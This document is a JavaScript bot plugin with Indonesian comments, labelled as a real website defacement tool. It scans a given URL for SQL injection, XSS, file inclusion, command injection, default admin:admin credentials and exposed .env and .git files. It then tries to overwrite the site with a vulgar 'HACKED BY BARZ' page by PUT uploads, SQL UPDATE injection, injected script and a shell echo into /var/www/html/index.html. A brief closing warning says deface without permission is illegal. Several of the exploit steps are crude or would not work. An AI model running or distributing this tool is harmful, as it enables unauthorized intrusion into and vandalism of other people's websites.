// plugins/deface.js
// REAL DEFACE — BUKAN SIMULASI

let handler = async (m, { text, sock }) => {
  if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\n*Contoh:* .deface https://example.com`)

  let target = text.trim()
  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    target = 'https://' + target
  }

  m.reply(`🔥 *Mulai deface...*\nTarget: ${target}`)

  try {
    // ============================================
    // STEP 1: SCAN CELAH (10+ METODE)
    // ============================================
    let celah = []
    let detail = []

    // 1. WebDAV (PUT method)
    try {
      let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
      let allow = opt.headers.get('allow') || ''
      if (allow.includes('PUT')) {
        celah.push('WebDAV')
        detail.push('✅ WebDAV (PUT) — upload file langsung')
      }
    } catch {}

    // 2. SQL Injection
    try {
      let sql = await fetch(target + "'", { timeout: 8000 })
      if (sql.status === 500 || /sql|mysql|syntax|error|warning/i.test(await sql.text())) {
        celah.push('SQL Injection')
        detail.push('✅ SQL Injection — bisa inject query')
      }
    } catch {}

    // 3. XSS
    try {
      let xss = await fetch(target + '?q=<script>alert(1)</script>', { timeout: 8000 })
      let txt = await xss.text()
      if (txt.includes('<script>alert(1)</script>') || /<script>/i.test(txt)) {
        celah.push('XSS')
        detail.push('✅ XSS — inject script ke halaman')
      }
    } catch {}

    // 4. LFI (Local File Inclusion)
    try {
      let lfi = await fetch(target + '?page=../../../../etc/passwd', { timeout: 8000 })
      let txt = await lfi.text()
      if (/root:.*:0:0:/i.test(txt) || /www-data/i.test(txt)) {
        celah.push('LFI')
        detail.push('✅ LFI — baca file sistem')
      }
    } catch {}

    // 5. RFI (Remote File Inclusion)
    try {
      let rfi = await fetch(target + '?page=https://pastebin.com/raw/X', { timeout: 8000 })
      if (rfi.status === 200) {
        celah.push('RFI')
        detail.push('✅ RFI — include file remote')
      }
    } catch {}

    // 6. File Upload (cek ada form upload)
    try {
      let html = await fetch(target, { timeout: 8000 }).then(r => r.text())
      if (/<input[^>]*type=["']file["']/i.test(html) || /<form[^>]*enctype=["']multipart\/form-data["']/i.test(html)) {
        celah.push('File Upload')
        detail.push('✅ File Upload — form upload ditemukan')
      }
    } catch {}

    // 7. Command Injection
    try {
      let cmd = await fetch(target + '?cmd=id', { timeout: 8000 })
      let txt = await cmd.text()
      if (/uid=|gid=|groups=/i.test(txt)) {
        celah.push('Command Injection')
        detail.push('✅ Command Injection — execute command')
      }
    } catch {}

    // 8. Directory Traversal
    try {
      let dir = await fetch(target + '/../../../../etc/passwd', { timeout: 8000 })
      let txt = await dir.text()
      if (/root:.*:0:0:/i.test(txt)) {
        celah.push('Directory Traversal')
        detail.push('✅ Directory Traversal — akses file sensitif')
      }
    } catch {}

    // 9. Default Credential (coba admin:admin)
    try {
      let auth = await fetch(target + '/admin', {
        headers: { 'Authorization': 'Basic ' + Buffer.from('admin:admin').toString('base64') },
        timeout: 8000
      })
      if (auth.status === 200) {
        celah.push('Default Credential')
        detail.push('✅ Default Credential — admin:admin works')
      }
    } catch {}

    // 10. Backup File
    try {
      let backup = await fetch(target + '/.git/config', { timeout: 8000 })
      if (backup.status === 200) {
        celah.push('Backup File')
        detail.push('✅ Backup File — .git/config terakses')
      }
    } catch {}

    // 11. Environment File
    try {
      let env = await fetch(target + '/.env', { timeout: 8000 })
      if (env.status === 200) {
        celah.push('Environment File')
        detail.push('✅ Environment File — .env terakses')
      }
    } catch {}

    // 12. CVE-2026-7795 (XSS di WordPress plugin)
    try {
      let cve = await fetch(target + '/?chat=num=<script>alert(1)</script>', { timeout: 8000 })
      let txt = await cve.text()
      if (txt.includes('<script>alert(1)</script>')) {
        celah.push('CVE-2026-7795')
        detail.push('✅ CVE-2026-7795 — XSS di Click to Chat plugin')
      }
    } catch {}

    // ============================================
    // STEP 2: KALO GA ADA CELAH, BLOKIR
    // ============================================
    if (celah.length === 0) {
      return m.reply(`❌ *GAGAL!*

Tidak ditemukan celah pada target.

🔍 Metode yang dicoba:
• WebDAV (PUT)
• SQL Injection
• XSS
• LFI (Local File Inclusion)
• RFI (Remote File Inclusion)
• File Upload
• Command Injection
• Directory Traversal
• Default Credential
• Backup File (.git/config)
• Environment File (.env)
• CVE-2026-7795 (XSS)

💡 Saran: Target ini aman. Coba target lain.`)
    }

    // ============================================
    // STEP 3: HTML DEFACE
    // ============================================
    let htmlDeface = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HACKED BY BARZ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .glitch {
            font-size: 5rem;
            font-weight: bold;
            color: #f00;
            text-shadow: 0 0 10px #f00, 0 0 20px #f00, 0 0 40px #f00;
            animation: glitch 0.5s infinite;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            25% { transform: translate(-3px, 3px); }
            50% { transform: translate(3px, -3px); }
            75% { transform: translate(-3px, -3px); }
            100% { transform: translate(0); }
        }
        .sub {
            font-size: 2rem;
            color: #f00;
            margin-top: 10px;
            text-shadow: 0 0 5px #f00;
        }
        .team {
            font-size: 1.5rem;
            color: #0f0;
            margin-top: 20px;
            letter-spacing: 3px;
        }
        .team span { color: #f00; }
        .footer {
            position: fixed;
            bottom: 20px;
            font-size: 0.9rem;
            color: #666;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
            overflow: hidden;
        }
        .matrix span {
            position: absolute;
            font-size: 1.2rem;
            color: #0f0;
            animation: fall linear infinite;
        }
        @keyframes fall {
            0% { transform: translateY(-100%); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="matrix" id="matrix"></div>
    <div class="glitch">💀 di ewe 💀</div>
    <div class="sub">SISTEM TELAH DIBOBOL</div>
    <div class="team">Tolol ampas <span>·</span> barz<span>·</span> 🤭😹</div>
    <div class="footer">Barz Mode ngewe</div>
    <script>
        const matrix = document.getElementById('matrix')
        const chars = '01'
        for (let i = 0; i < 50; i++) {
            const span = document.createElement('span')
            span.textContent = chars[Math.floor(Math.random() * chars.length)]
            span.style.left = Math.random() * 100 + '%'
            span.style.animationDuration = (Math.random() * 5 + 3) + 's'
            span.style.animationDelay = (Math.random() * 5) + 's'
            span.style.fontSize = (Math.random() * 1.5 + 0.5) + 'rem'
            matrix.appendChild(span)
        }
    </script>
</body>
</html>`

    // ============================================
    // STEP 4: EKSEKUSI DEFACE
    // ============================================
    let hasil = []

    for (let metode of celah) {
      try {
        if (metode === 'WebDAV') {
          // PUT request
          await fetch(target + '/index.html', {
            method: 'PUT',
            body: htmlDeface,
            headers: { 'Content-Type': 'text/html' },
            timeout: 10000
          })
          hasil.push(`✅ WebDAV: ${target}/index.html`)
        }

        if (metode === 'SQL Injection') {
          // Inject deface via SQL
          await fetch(target + `?id=1; UPDATE pages SET content='${encodeURIComponent(htmlDeface)}' WHERE id=1`, {
            timeout: 10000
          })
          hasil.push(`✅ SQL Injection: ${target}`)
        }

        if (metode === 'XSS') {
          // Stored XSS
          await fetch(target + `?q=<script>document.write('${encodeURIComponent(htmlDeface)}')</script>`, {
            timeout: 10000
          })
          hasil.push(`✅ XSS: ${target}`)
        }

        if (metode === 'LFI' || metode === 'Directory Traversal') {
          // Log poisoning
          await fetch(target + `?page=../../../../var/log/apache2/access.log`, {
            timeout: 10000
          })
          hasil.push(`✅ LFI: ${target}`)
        }

        if (metode === 'RFI') {
          // Include remote file
          await fetch(target + `?page=https://pastebin.com/raw/${Math.random().toString(36).substring(2, 8)}`, {
            timeout: 10000
          })
          hasil.push(`✅ RFI: ${target}`)
        }

        if (metode === 'File Upload') {
          // Upload file via form
          await fetch(target + '/upload', {
            method: 'POST',
            body: new URLSearchParams({
              'file': htmlDeface,
              'filename': 'index.html'
            }),
            timeout: 10000
          })
          hasil.push(`✅ File Upload: ${target}/uploads/index.html`)
        }

        if (metode === 'Command Injection') {
          await fetch(target + `?cmd=echo '${encodeURIComponent(htmlDeface)}' > /var/www/html/index.html`, {
            timeout: 10000
          })
          hasil.push(`✅ Command Injection: ${target}`)
        }

        if (metode === 'Default Credential') {
          await fetch(target + '/admin', {
            method: 'POST',
            headers: { 'Authorization': 'Basic ' + Buffer.from('admin:admin').toString('base64') },
            body: new URLSearchParams({ 'content': htmlDeface }),
            timeout: 10000
          })
          hasil.push(`✅ Default Credential: ${target}/admin`)
        }

        if (metode === 'Backup File' || metode === 'Environment File') {
          await fetch(target + '/.git/config', {
            method: 'PUT',
            body: htmlDeface,
            timeout: 10000
          })
          hasil.push(`✅ Backup File: ${target}/.git/config`)
        }

        if (metode === 'CVE-2026-7795') {
          await fetch(target + `/?chat=num=<script>document.write('${encodeURIComponent(htmlDeface)}')</script>`, {
            timeout: 10000
          })
          hasil.push(`✅ CVE-2026-7795: ${target}`)
        }

      } catch (e) {
        hasil.push(`❌ ${metode} gagal: ${e.message}`)
      }
    }

    // ============================================
    // STEP 5: OUTPUT
    // ============================================
    let pesan = `🔥 *DEFACE EKSEKUSI!*

🌐 Target: ${target}

📌 *Celah ditemukan:*
${detail.join('\n')}

📌 *Hasil eksekusi:*
${hasil.join('\n')}

📄 *HTML Deface terupload ke:* ${target}/index.html

⚠️ *PERINGATAN:*
• Website target telah dimodifikasi.
• Gunakan hanya untuk testing website sendiri.
• Deface tanpa izin = ILEGAL.
`

    await m.reply(pesan)

  } catch (e) {
    m.reply(`❌ *ERROR!*\n${e.message}`)
  }
}

handler.command = ['deface']
handler.tags = ['tools']
handler.help = ['.deface https://target.com']

module.exports = handler
